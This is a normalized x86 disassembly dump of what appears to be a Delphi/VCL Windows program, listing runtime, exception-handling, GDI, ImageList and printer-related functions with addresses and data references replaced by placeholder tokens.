pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b6ab
jmp sub_4035c4
sub_41b6b0
mov ebx 0x80030103
call sub_40392c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b72e
jmp sub_4035c4
sub_41b733
mov ebx 0x80030009
call sub_40392c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41b791
jmp sub_4035c4
sub_41b796
mov ebx 0x8000ffff
call sub_40392c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b961
jmp sub_403878
sub_41b972
jmp sub_4035c4
sub_41b977
mov [ ebp - 0x4 ] 0x8000ffff
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9a0
lea eax [ ebp + 0xc ]
call sub_405598
retn
sub_41b999
jmp sub_403878
sub_41b9a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41b9ac
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41b9b8
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41b9c4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41b9d0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ba3f
jmp sub_4035c4
sub_41ba44
mov esi 0x8000ffff
call sub_40392c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41ba58
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41bac5
jmp sub_403878
sub_41bacc
mov eax [ rw-data ]
call sub_403124
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41badc
call sub_4138f8
retn
sub_41bba4
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41bd48
jmp sub_403878
sub_41bd4f
pop ebp
retn
sub_41bddd
jmp sub_403878
sub_41bde4
pop ebp
retn
sub_41c0fd
jmp sub_403878
sub_41c104
pop ebp
retn
sub_41c108
sub [ rw-data ] 0x1
retn
sub_41c755
inc ecx
add [ eax ] bl
add [ eax ] al
[ esp ]
sub_41c75d
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x3b9a9b91 ] al
retn 0x41
sub_41caaa
popad
0x41
sub_41cc2c
push es
int3
sub_41d0f0
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41d164
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41d1d8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41d1e4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41d2c4
jmp sub_403878
sub_41d2cb
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d35b
jmp sub_403878
sub_41d3ed
jmp sub_403878
sub_41d3f4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d458
jmp sub_403878
sub_41d45f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d4c7
jmp sub_403878
sub_41d4ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d571
jmp sub_403878
sub_41d578
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d9d0
push 0x33
mov ecx rw-data
call sub_413bb8
retn
sub_41d9e0
push 0x33
mov ecx rw-data
call sub_413b78
retn
sub_41d9f0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41da14
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41dbe8
push 0x11
mov ecx rw-data
call sub_413b78
retn
sub_41dd28
push ebx
mov ebx eax
mov eax ebx
call sub_41d9f0
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41dde2
jmp sub_403878
sub_41dde9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41ddff
jmp sub_403878
sub_41de18
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41de75
jmp sub_403878
sub_41de7c
pop ebx
pop ecx
pop ebp
retn
sub_41dff5
jmp sub_403878
sub_41e01d
jmp sub_403878
sub_41e024
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41e090
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40415c
pop esi
pop ebx
retn
sub_41e104
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41e060
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41e140
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41e178
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41e1a8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41e2c6
jmp sub_403878
sub_41e2cd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41e2e3
jmp sub_403878
sub_41e359
jmp sub_403878
sub_41e360
pop ebx
pop ecx
pop ebp
retn
sub_41e364
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41e41a
jmp sub_403878
sub_41e42c
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403320
sub_41e440
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41e470
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41e57f
jmp sub_403878
sub_41e586
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da14
retn
sub_41e59c
jmp sub_403878
sub_41e615
jmp sub_403878
sub_41e61c
pop ebx
pop ecx
pop ebp
retn
sub_41e74d
jmp sub_403878
sub_41e760
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41eaa0
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41ec7c
jmp sub_403878
sub_41ec83
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41ec8c
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41ecc4
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41ecd0
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41ee10
retn
sub_41eed9
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41eef0
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41efdc
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41effc
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41f01c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41f03c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
pop ebx
retn
sub_41f054
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
pop ebx
retn
sub_41f078
mov eax [ rw-data ]
call sub_41f054
retn
sub_41f0da
jmp sub_403878
sub_41f0e1
pop ecx
pop ebp
retn
sub_41f180
jmp sub_403878
sub_41f187
pop ebx
mov esp ebp
pop ebp
retn
sub_41f259
jmp sub_403878
sub_41f2ea
jmp sub_403878
sub_41f2f1
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f31c
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41f403
jmp sub_403878
sub_41f5b0
jmp sub_403878
sub_41f5b7
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41f7c9
jmp sub_403878
sub_41f7d0
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41f86a
jmp sub_403878
sub_41fa46
jmp sub_403878
sub_41fb00
jmp sub_403878
sub_41fb07
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb27
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41fb20
jmp sub_403878
sub_41fb27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fcb5
jmp sub_403878
sub_41fe80
jmp sub_403878
sub_41fe87
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41feaa
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402704
retn
sub_41fea3
jmp sub_403878
sub_41feaa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41feca
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402704
retn
sub_41fec3
jmp sub_403878
sub_41feca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41fed4
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_420034
push 0x0
call sub_41ffd0
retn
sub_4200d9
jmp sub_403878
sub_4200e0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4200ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_42003c
pop ebx
pop ebp
retn 0x4
sub_420100
retn
sub_420104
test eax eax
jne r-xdata
retn
call sub_420100
sub_4202d7
jmp sub_403878
sub_4202fe
jmp sub_403878
sub_420305
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420344
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_420511
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_42051a
jmp sub_403878
j_sub_420511
jmp sub_420511
sub_420521
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
retn
sub_420537
jmp sub_403878
sub_420548
xor eax eax
retn
sub_42054c
mov al [ eax + 0x21 ]
retn
sub_420598
jmp sub_403878
sub_42059f
pop esi
pop ecx
pop ebp
retn
sub_4205cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_420623
jmp sub_403878
sub_42062a
pop esi
pop ecx
pop ebp
retn
sub_420630
retn
sub_420634
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420644
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_4207c9
jmp sub_403878
sub_4207d0
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4208ef
jmp sub_403878
sub_4208f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_420987
jmp sub_403878
sub_42098e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420a16
jmp sub_403878
sub_420a1d
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420ba7
jmp sub_403878
sub_420bae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420d64
jmp sub_4035c4
sub_420d88
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206ec
mov [ rw-data ] eax
sub_420da8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_420c74
mov [ rw-data ] eax
sub_420ed0
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_420e6c
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_420f78
jmp sub_4035c4
sub_42105b
jmp sub_4035c4
sub_4210bc
jmp sub_403878
sub_4210c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4210cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_420ed0
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_4210e4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420ed0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_42122d
jmp sub_4035c4
sub_4212ab
jmp sub_403878
sub_4212b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42144c
retn
sub_4215ec
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4218f0
jmp sub_403878
sub_4218f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421a6f
jmp sub_403878
sub_421a76
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421b05
jmp sub_403878
sub_421b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b2e
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
sub_421b27
jmp sub_403878
sub_421b2e
pop ebx
mov esp ebp
pop ebp
retn
sub_421b41
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_421e28
jmp r-xdata
retn
sub_421b57
call sub_421eb4
retn
sub_421c4c
retn
sub_421ea4
jmp sub_403878
sub_421fcf
jmp sub_403878
sub_421fd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_421fef
jmp sub_403878
sub_4221c6
jmp sub_403878
sub_4221ee
jmp sub_403878
sub_4221f5
mov esp ebp
pop ebp
retn
sub_42226c
jmp sub_403878
sub_422374
jmp sub_403878
sub_42245f
jmp sub_403878
sub_42246c
inc [ eax + 0x4 ]
retn
sub_4225e7
jmp sub_403878
sub_422998
jmp sub_403878
sub_422be2
jmp sub_403878
sub_422c0c
jmp sub_403878
sub_422c13
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c35
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_422c2e
jmp sub_403878
sub_422c3f
jmp sub_4035c4
sub_422c8e
jmp sub_403878
sub_422ebb
jmp sub_403878
sub_422f03
jmp sub_403878
sub_423070
jmp sub_403878
sub_423137
jmp sub_4035c4
sub_42318c
mov [ eax + 0x31 ] 0x0
call sub_420344
retn
sub_4233dd
jmp sub_403878
sub_423448
jmp sub_403878
sub_42344f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4234c0
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_423574
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_423584
push ebx
mov ebx eax
mov eax ebx
call sub_42373c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_423598
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4235b4
push ebx
mov ebx eax
mov eax ebx
call sub_42379c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_423610
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42371f
jmp sub_403878
sub_423950
jmp sub_403878
sub_423957
pop ebx
pop ecx
pop ebp
retn
sub_4239e3
jmp sub_4035c4
sub_423a43
jmp sub_403878
sub_423a4a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_423e2b
jmp sub_403878
sub_423e57
jmp sub_403878
sub_423ebe
jmp sub_4035c4
sub_423eef
jmp sub_403878
sub_423f74
jmp sub_4035c4
sub_423f79
mov eax [ ebp - 0x38 ]
call sub_403124
call sub_4038d8
call sub_40392c
sub_423f8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423fa8
mov eax [ ebp - 0x18 ]
call sub_402704
retn
sub_423fa1
jmp sub_403878
sub_4240f7
jmp sub_4035c4
sub_4243c3
jmp sub_4035c4
sub_4244a4
mov cl 0x1
call sub_4244ac
retn
sub_424761
add [ eax ] al
add [ ebx ] dh
leave
call sub_4244ac
retn
sub_4247e6
jmp sub_4035c4
sub_4247eb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4038d8
call sub_40392c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42483c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_424975
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_4249a4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4249b8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_424ad1
jmp sub_4035c4
sub_424b86
jmp sub_4035c4
sub_424bf0
jmp sub_4035c4
sub_424c24
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_424bb0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_424c3c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41f03c
retn
mov [ eax + 0x30 ] edx
retn
sub_424c54
retn
sub_424c58
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41f03c
retn
mov [ eax + 0x2c ] edx
retn
sub_424c98
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41f03c
pop ebp
retn 0x4
sub_424cac
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41f03c
pop ebp
retn 0x4
sub_424d01
jmp sub_403878
sub_424d08
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424ebc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_424ec8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_424f75
jmp sub_403878
sub_424f7c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425067
jmp sub_4035c4
sub_4250d3
jmp sub_403878
sub_425201
jmp sub_403878
sub_425208
pop ebp
retn
sub_42533d
jmp sub_403878
sub_425344
pop ebp
retn
sub_425348
sub [ rw-data ] 0x1
retn
sub_425590
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_414108
retn
sub_4255c4
mov eax [ eax + 0x4 ]
call sub_413fac
retn
sub_4255f5
jmp sub_403878
sub_4255fc
pop ebp
retn
sub_425600
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_4256f1
jmp sub_403878
sub_4256f8
pop ebp
retn
sub_4256fc
sub [ rw-data ] 0x1
retn
sub_4257c3
jmp sub_403878
sub_4257ca
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425de0
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4257ec
mov [ rw-data ] sub_425904
mov [ rw-data ] sub_425874
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_425b08
mov [ rw-data ] sub_425bdc
mov [ rw-data ] sub_425cb0
retn
sub_425e71
jmp sub_403878
sub_425e78
pop ebp
retn
sub_425e7c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425de0
sub_425eb1
jmp sub_403878
sub_425eb8
pop ebp
retn
sub_425ebc
sub [ rw-data ] 0x1
retn
sub_42614b
add eax 0xffffffd4
jmp sub_426c78
sub_426153
add eax 0xffffffd4
jmp sub_426cd4
sub_426165
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40566c
sub_42616f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405680
sub_4262fe
jmp sub_403878
sub_426305
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426515
jmp sub_403878
sub_42651c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4266d1
jmp sub_403878
sub_426736
jmp sub_403878
sub_42673d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426829
jmp sub_403878
sub_426830
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426a40
lea eax [ ebp - 0x30 ]
call sub_403ef8
lea eax [ ebp - 0x20 ]
call sub_403ef8
retn
sub_426a51
jmp sub_403878
j_sub_426a40
jmp sub_426a40
sub_426a58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426b53
jmp sub_403878
sub_426b5a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426c57
jmp sub_403878
sub_426c5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426cbe
lea eax [ ebp - 0x4 ]
call sub_405598
retn
sub_426cc7
jmp sub_403878
j_sub_426cbe
jmp sub_426cbe
sub_426cce
pop ebx
pop ecx
pop ebp
retn
sub_426d69
jmp sub_403878
sub_426d70
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_426d7c
mov eax [ eax + 0x20 ]
retn
sub_426eab
jmp sub_403878
sub_426eb2
pop ebp
retn
sub_426eb4
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_426f01
jmp sub_403878
sub_426f08
pop ebp
retn
sub_426f0c
sub [ rw-data ] 0x1
retn
sub_4271bb
jmp sub_403878
sub_4271c2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4273a2
jmp sub_403878
sub_4273a9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427415
jmp sub_403878
sub_42741c
pop ecx
pop ecx
pop ebp
retn
sub_427733
jmp sub_403878
sub_42773a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42779b
jmp sub_403878
sub_4277a2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_427812
jmp sub_403878
sub_427819
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427820
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_427a78
sub_427a13
jmp sub_403878
sub_427a24
jmp sub_4035c4
sub_427a67
jmp sub_403878
sub_427a6e
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427c15
jmp sub_403878
sub_427c55
jmp sub_403878
sub_427c5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427cb4
add eax 0x8
call sub_40d1c0
retn
sub_427cc0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4271cc
mov [ rw-data ] eax
sub_427d11
jmp sub_403878
sub_427d18
pop ebp
retn
sub_427d1c
sub [ rw-data ] 0x1
retn
sub_428029
jmp sub_403878
sub_428030
pop ebp
retn
sub_428034
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_427d80
sub_428114
retn
sub_428188
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_428194
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_4281a0
mov edx [ eax ]
call [ edx ]
retn
sub_4281a8
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_4281d5
jmp sub_403878
sub_4281dc
pop ebp
retn
sub_4281e0
sub [ rw-data ] 0x1
retn
sub_42839f
jmp sub_403878
sub_4283a6
pop ebp
retn
sub_42875b
jmp sub_403878
sub_428762
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_428b7c
jmp sub_403878
sub_428b83
pop ebp
retn
sub_428b88
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428118
mov [ rw-data ] eax
sub_428bc9
jmp sub_403878
sub_428bd0
pop ebp
retn
sub_428bd4
sub [ rw-data ] 0x1
retn
sub_428c01
jmp sub_403878
sub_428c08
pop ebp
retn
sub_428c0c
sub [ rw-data ] 0x1
retn
sub_428c39
jmp sub_403878
sub_428c40
pop ebp
retn
sub_428c44
sub [ rw-data ] 0x1
retn
sub_428c71
jmp sub_403878
sub_428c78
pop ebp
retn
sub_428c7c
sub [ rw-data ] 0x1
retn
sub_428ca9
jmp sub_403878
sub_428cb0
pop ebp
retn
sub_428cb4
sub [ rw-data ] 0x1
retn
sub_428ce1
jmp sub_403878
sub_428ce8
pop ebp
retn
sub_428cec
